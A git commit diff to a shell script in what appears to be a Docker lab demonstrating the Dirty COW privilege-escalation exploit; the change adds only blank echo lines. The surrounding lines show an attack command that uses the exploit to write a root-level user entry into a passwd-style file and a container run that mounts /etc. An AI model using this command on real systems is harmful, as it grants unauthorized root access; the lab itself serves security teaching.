9530dfd63c0a4ac29640fe66bcd8fab65f963d6f
dstubked <45514912+dstubked@users.noreply.github.com>
2019-07-22 18:49:03 +0800

    Update 05-panic.sh

--- dirtyc0w/05-panic.sh
+++ dirtyc0w/05-panic.sh
@@ -3,5 +3,7 @@ clear
 echo "**Bringing up attack shell**"
 echo "**touch /tmp/passwdtest**"
 echo "**Attack command** ./dirtyc0w /tmp/passwdtest $'cowuser:x:0:0:root:/root:/bin/bash\n'"
+echo " "
+echo " "
 echo "docker run -it -v /etc/:/tmp/:ro bpdockerlab/dirtyc0w:1.0 /bin/sh"
 docker run -it -v /etc/:/tmp/:ro bpdockerlab/dirtyc0w:1.0 /bin/sh
